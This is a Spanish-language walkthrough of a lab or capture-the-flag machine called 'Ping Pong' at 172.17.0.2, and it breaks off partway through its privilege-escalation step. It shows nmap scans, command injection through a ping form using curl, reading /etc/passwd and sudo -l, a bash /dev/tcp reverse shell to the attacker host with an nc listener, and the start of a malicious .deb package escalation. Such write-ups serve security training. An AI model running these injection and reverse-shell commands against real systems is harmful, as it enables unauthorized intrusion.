# Ping Pong (Nivel intermedio)

## 1. Empezamos por realizar un escaneo de firewall.

```bash
sudo nmap -sA 172.17.0.2
```

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-13 14:26 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
All 1000 scanned ports on 172.17.0.2 are in ignored states.
Not shown: 1000 unfiltered tcp ports (reset)
MAC Address: E6:C1:16:CF:B5:56 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
```

> Los paquetes devuelven el estado **unfiltered** con estado **RST**, lo que indica que no se está filtrando, por lo que no hay un firewall activo.

## 2. Escaneamos los puertos y servicios

```bash
sudo nmap -sS -sV -p- 172.17.0.2
```

```bash
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-13 14:29 -0500
Nmap scan report for 172.17.0.2
Host is up (0.0000020s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
80/tcp   open  http     Apache httpd 2.4.58 ((Ubuntu))
443/tcp  open  ssl/http Apache httpd 2.4.58 ((Ubuntu))
5000/tcp open  http      httpd 3.0.1 (Python 3.12.3)
MAC Address: E6:C1:16:CF:B5:56 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
```

- Puerto **80**: Está corriendo **Apache** 2.4.58 con un servicio http.
- Puerto **443**: Está corriendo **Apache** 2.4.58 con un servicio http.
- Puerto **5000**: Está corriendo **Wekzeug** 3.0.1 con un servicio httpd.
- **E6:C1:16:CF:B5:56** : Es la **mac** de la interfaz de red del servidor.

> En ambos casos de Apache, usa el protocolo http que funciona para servir páginas web.
>
> Werkzeug es una biblioteca para la el desarrollo de aplicaciones web que proporciona herramientas para el manejo de solicitudes y respuestas HTTP, el enrutamiento de URLs, la gestión de cookies, la autenticación y otras funcionalidades esenciales para el desarrollo web.

> <span style="color:#f67256;">**Werk­zeug** no está diseñado para producción, así que si está expuesto y accesible, es una mala práctica de seguridad.</span>
>
> Intentaremos vulnerar el puerto con el servicio **Wekzeug ** en el puerto **5000** ya que mi objetivo es buscar vulnerabilidades específicas en las aplicaciones.
>
> <span style="color:#f6e962;">Si el debug de **Wekzeug** está activo, el servidor puede estar exponiendo una consola interactiva remota, donde podría ejecutar código de python directamente en el servidor</span>

## 3. Intentamos vulnerar Wekzeug, así que probamos si tiene el debug activo con "curl".

Comprobamos si el debug está abierto, viendo qué tipo de respuesta nos da "**curl**" por ese puerto.

- Si **Wekzeug** tiene el depurador activo, nos devolverá una página de error con la información de la solicitud y una consola de depuración por lo que podríamos intentar enviar datos desde la consola de depuración que nos provee el servicio.

```bash
curl http://172.17.0.2:5000
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: #ecf0f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #34495e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #1abc9c;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #16a085;
        }
        .output {
            background-color: #ecf0f1;
            color: #2c3e50;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            text-align: left;
            height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ping Test</h1>
        <form method="post">
            <input type="text" name="ip_address" placeholder="IP Address" value="">
            <button type="submit">Ping!</button>
        </form>
        
    </div>
</body>

```

<span style="color:#f6e962;">Nos devolvió una página HTML con una interfaz presonalizada lo que nos indica que no tiene el debugger activo</span>

<span style="color:#f6e962;">El formulario que nos devolvió tiene un <Input /> que podemos probar para enviar un comando al servidor</span>

Bien por ellos, no tienen habilitada la consola de depuración de **Wekzeug**, pero posiblemente sigue siendo inseguro, así que procedemos a realizar una prueba de inyección en el sitio.

## 4. Intentamos hacer la inyección de comandos desde una petición POST con "curl".

- **-X POST** : Se va a realizar una solicitud HTTP con método POST, lo que indica que se enviarán datos.

- **-d "ip_address=8.8.8.8;whoami"** : Son los datos que se envían en el input, en este caso, mandamos una ip y el comando **whoami** separado por **";"**.

  Este comando es equivalente a escribir en el Input de la página "ip_address=8.8.8.8;whoami"" desde algún navegador.

> - ip_address: Es el parámetro que debemos enviar en el Input de la página, como vimos en el html que devolvió, sirve para hacer ping a una IP.
> - Separamos con **"";""** para que en el input se escriba la ip **8.8.8.8** y luego envíe el comando **whoami**.
> - **whoami**: Nos devuelve el dueño de la sesión que está en la máquina, es un pequeño comando infiltrado luego del comando de hacer ping.

```bash
curl -X POST -d "ip_address=8.8.8.8;whoami" http://172.17.0.2:5000
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: #ecf0f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #34495e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #1abc9c;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #16a085;
        }
        .output {
            background-color: #ecf0f1;
            color: #2c3e50;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            text-align: left;
            height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ping Test</h1>
        <form method="post">
            <input type="text" name="ip_address" placeholder="IP Address" value="8.8.8.8;whoami">
            <button type="submit">Ping!</button>
        </form>
        
            <div class="output">
                <pre>PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=118 time=17.2 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=118 time=116 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=118 time=16.8 ms
64 bytes from 8.8.8.8: icmp_seq=4 ttl=118 time=122 ms

--- 8.8.8.8 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 16.754/68.133/122.282/51.183 ms
freddy
</pre>
            </div>
        
    </div>
</body>
</html>
```

- El ping se realizó con éxito a la url 8.8.8.8.
- El comando whoami se ejecutó y nos muestra el nombre del usuario **freddy**.

### <span style="color:#36a736;">Como **Wekzeug** nos devolvió el comando whoami, sabemos que está aceptando parámetros de consola, por lo que podemos exporar todo el entorno donde está montado el servicio.</span>

## 5. Primero miramos cuál es el sistema operativo del sistema.

- **uname -a** : Añadimos este comando al parámetro, para obtener información del sistema en casos de sistemas operativos Unix.

  > Si el sistema operativo fuese Windows, intentaríamos con systeminfo u otro comando.

```sh
curl -X POST -d "ip_address=127.0.0.1; uname -a" http://172.17.0.2:5000
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: #ecf0f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #34495e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #1abc9c;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #16a085;
        }
        .output {
            background-color: #ecf0f1;
            color: #2c3e50;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            text-align: left;
            height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ping Test</h1>
        <form method="post">
            <input type="text" name="ip_address" placeholder="IP Address" value="127.0.0.1; uname -a">
            <button type="submit">Ping!</button>
        </form>
        
            <div class="output">
                <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.043 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.043 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3031ms
rtt min/avg/max/mdev = 0.015/0.034/0.043/0.011 ms
Linux a08bdd2ca115 6.1.4-arch1-1 #1 SMP PREEMPT_DYNAMIC Sat, 07 Jan 2023 15:10:07 +0000 x86_64 x86_64 x86_64 GNU/Linux
</pre>
            </div>
        
    </div>
</body>
```

- Nos indica que estamos en sistema operativo Linux.

  ### <span style="color:#36a736;">Lo primero que nos inetersa es obtener acceso al sistema, por lo que nos dirigimos a ver los usuarios en la ruta /etc/passwd</span>

## 6. Intentamos obtener los usuarios del sistema para un posible ingreso

```sh
curl -X POST -d "ip_address=127.0.0.1; cat /etc/passwd" http://172.17.0.2:5000
```

```htaccess
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: #ecf0f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #34495e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #1abc9c;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #16a085;
        }
        .output {
            background-color: #ecf0f1;
            color: #2c3e50;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            text-align: left;
            height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ping Test</h1>
        <form method="post">
            <input type="text" name="ip_address" placeholder="IP Address" value="127.0.0.1; cat /etc/passwd">
            <button type="submit">Ping!</button>
        </form>
        
            <div class="output">
                <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.029 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.044 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.070 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3043ms
rtt min/avg/max/mdev = 0.029/0.046/0.070/0.014 ms
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
freddy:x:1001:1001::/home/freddy:/bin/bash
bobby:x:1002:1002::/home/bobby:/bin/bash
gladys:x:1003:1003::/home/gladys:/bin/bash
chocolatito:x:1004:1004::/home/chocolatito:/bin/bash
theboss:x:1005:1005::/home/theboss:/bin/bash
</pre>
            </div>
        
    </div>
</body>

```

En este punto obtuvimos los usuarios del sistema en el siguiente formato:

```sh
usuario:x:UID:GID:comentario:/home/usuario:/shell
```

- **usuario**: nombre del usuario
- **x**: indica que la contraseña está en /etc/shadow
- **UID**: ID del usuario (0 = root)
- **GID**: ID del grupo principal
- **comentario**: campo informativo (nombre real u otro)
- **home**: directorio personal del usuario
- **shell**: intérprete por defecto (por ejemplo, /bin/bash)

### <span style="color:#36a736;">Observamos que hay un usuario root así que quiero buscar comandos SUID para escalar los pribilegios</span>

## 7. Como tenemos un usuario "freddy", podemos ver qué comandos puede ejecutar nuestro usuario.

- **sudo -l** : Lista los privilegios de sudo del usuario actual.

```sh
curl -X POST -d "ip_address=127.0.0.1; sudo -l" http://172.17.0.2:5000
```

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ping Test</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #2c3e50;
            color: #ecf0f1;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #34495e;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
            width: 400px;
            text-align: center;
        }
        input[type="text"] {
            width: calc(100% - 22px);
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background-color: #1abc9c;
            color: white;
            cursor: pointer;
        }
        button:hover {
            background-color: #16a085;
        }
        .output {
            background-color: #ecf0f1;
            color: #2c3e50;
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            text-align: left;
            height: 150px;
            overflow-y: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Ping Test</h1>
        <form method="post">
            <input type="text" name="ip_address" placeholder="IP Address" value="127.0.0.1; sudo -l">
            <button type="submit">Ping!</button>
        </form>
        
            <div class="output">
                <pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.037 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.041 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.044 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3045ms
rtt min/avg/max/mdev = 0.020/0.035/0.044/0.009 ms
Matching Defaults entries for freddy on a08bdd2ca115:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User freddy may run the following commands on a08bdd2ca115:
    (bobby) NOPASSWD: /usr/bin/dpkg
</pre>
            </div>
        
    </div>
</body>
</html>[
```

### **Hallazgo importante!!!**

```bash
User freddy may run the following commands on a08bdd2ca115:
    (bobby) NOPASSWD: /usr/bin/dpkg
```

### <span style="color:#36a736;">Significa que el usuario "freddy" puede ejecutar dpkg como el usuario "bobby" sin contraseña.</span>

## 8. La idea es traernos un ReverseShell y escucharlo con "nc":

- Ejecutamos "nc" en nuestro host para escuchar la respuesta del shell. **(ESTO DEBE ESTAR CORRIENDO ANTES QUE EL SIGUIENTE COMANDO!!!).*

  ```sh
  nc -lvnp 4444
  ```

- Mandamos la ejecución de un shell a la víctima donde 172.17.0.1 es nuestra ip en la red de docker:

  ```sh
  curl -X POST -d "ip_address=127.0.0.1; bash -c 'bash -i %3E%26 /dev/tcp/172.17.0.1/4444 0%3E%261'" http://172.17.0.2:5000
  ```

  **Ahora en nuestra máquina tenemos una terminal de freddy corriendo, lo que nos facilitará la escalada de privilegios**
  
  **Obtuvimos**:
  
  ```sh
  freddy@c84a657f3a83:~$ 
  ```

## 9. Intentamos escalar privilegios desde freddy hacia bobby y desde bobby hacia root.

1. Creamos un paquete malicioso que se ejecutará en el cliente:

2. Empaquetar los archivos:

   ```sh
   dpkg-deb --build package-root revshell2.deb
   ```

3. Descargamos el paquete que creamos en el servidor de la víctima

   ```sh
   python3 -c "import urllib.request; urllib.request.urlretrieve('http://172.17.0.1:8080/revshell.deb', '/tmp/revshell.deb')"
   ```

4. Validamos que el archivo se haya descargado

   ```sh
   ls -lh /tmp/revshell2.deb
   ```

5. Lanzar servidor desde el host para enviar el paquete revshell.deb

   ```sh
   python3 -m http.server 8080
   ```

6. 

   

